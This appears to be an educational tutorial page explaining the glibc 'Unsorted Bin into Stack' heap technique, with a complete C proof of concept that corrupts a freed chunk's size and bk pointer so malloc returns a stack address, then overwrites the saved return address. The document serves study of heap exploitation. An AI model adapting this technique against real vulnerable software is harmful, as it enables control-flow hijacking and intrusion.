#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Unsorted Bin into Stack",
    description: "Tricking the Unsorted Bin into returning a stack address by corrupting the BK pointer and size of a freed chunk.",
    date: "2025-12-26",
    order: 34,
  ),
)<frontmatter>

= glibc Allocator: Unsorted Bin into Stack

== Introduction

The "Unsorted Bin into Stack" attack is a technique that targets the *Unsorted Bin* to achieve an arbitrary memory allocation (in this case, on the stack). By corrupting the `bk` (backward) pointer and the `size` field of a chunk in the Unsorted Bin, an attacker can trick the allocator into treating a forged chunk on the stack as the next available chunk in the bin.

When a `malloc()` request is made that cannot be satisfied by the exact size of chunks in the Unsorted Bin, the allocator iterates through the bin. If we have corrupted a chunk's `bk` to point to our stack-based fake chunk, and we've set the original chunk's `size` to something small (to trigger the sorting/iteration logic), the allocator will eventually process our fake chunk.

== Prerequisites
- *Unsorted Bin Corruption*: Ability to overwrite both the `size` and `bk` pointers of a chunk in the Unsorted Bin.
- *Fake Chunk Control*: Ability to forge a valid chunk header at the target location (e.g., the stack).
- *GLIBC Version*: Effective on glibc < 2.29. Newer versions check if `victim->bk->fd == victim`.

== Example Code

This PoC demonstrates the attack by returning a pointer to a stack buffer and using it to overwrite the saved return address.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
	intptr_t stack_buffer[4] = {0};

	printf("Allocating the victim chunk\n");
	intptr_t* victim = malloc(0x100);

	printf("Allocating another chunk to avoid consolidation with top chunk\n");
	intptr_t* p1 = malloc(0x100);

	printf("Freeing the victim chunk, it will be inserted in the unsorted bin\n");
	free(victim);

	printf("Create a fake chunk on the stack\n");
	// Set size for next allocation (0x100 request -> 0x110 chunk size)
	stack_buffer[1] = 0x100 + 0x10;
	// Set bk to a writable address (doesn't matter much for this simple PoC)
	stack_buffer[3] = (intptr_t)stack_buffer;

	//------------VULNERABILITY-----------
	printf("Now emulating a vulnerability that can overwrite victim->size and victim->bk\n");

	// We set size to a small value (32) so that a malloc(0x100)
	// won't be satisfied by this chunk directly.
	victim[-1] = 32;

	// Set bk to our fake stack chunk
	victim[1] = (intptr_t)stack_buffer;
	//------------------------------------

	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
	char *p2 = malloc(0x100);
	printf("malloc(0x100): %p\n", p2);

	intptr_t sc = (intptr_t)jackpot;
	// Overwrite return address on stack (offset depends on environment)
	memcpy((p2+40), &sc, 8);

	assert((long)__builtin_return_address(0) == (long)jackpot);
}
```

== Attack Flow Explained

=== 1. Bin Preparation

We allocate and then free a `victim` chunk. Because it's large enough and not adjacent to the top chunk (thanks to `p1`), it's placed in the *Unsorted Bin*.

=== 2. Forging the Stack Chunk

We set up a "fake" chunk header on the stack:
- `stack_buffer[1]`: This is the `size` field. It must be at least as large as the next `malloc` request (plus metadata) to be considered a valid candidate.
- `stack_buffer[3]`: This is the `bk` field. In a simple Unsorted Bin attack, this can point to any writable memory to avoid crashes during the `unlink`-like operation performed when the chunk is removed.

=== 3. The Vulnerability: Corrupting the Freed Chunk

We assume a vulnerability (like a Use-After-Free or heap overflow) allows us to modify the metadata of the `victim` chunk while it's in the Unsorted Bin.

1. *Shrink the size*: We set `victim->size` to a small value (e.g., `32`). This ensures that when we later call `malloc(0x100)`, the allocator will decide this chunk is too small to satisfy the request and will move to the next chunk in the `bk` chain.
2. *Corrupt BK*: We point `victim->bk` to our `stack_buffer`.

=== 4. Triggering the Return

When `malloc(0x100)` is called:
1. The allocator looks at the first chunk in the Unsorted Bin (`victim`).
2. It sees `size == 32`, which is too small for a `0x110` (requested `0x100 + 0x10`) size.
3. It moves `victim` to the SmallBin and follows its `bk` pointer to the next chunk: our `stack_buffer`.
4. It sees our `stack_buffer` has `size == 0x110`.
5. It satisfies the request by returning `&stack_buffer[2]`.

The attacker now has a pointer to the stack and can perform arbitrary writes, such as overwriting the saved return address to hijack the program's control flow.
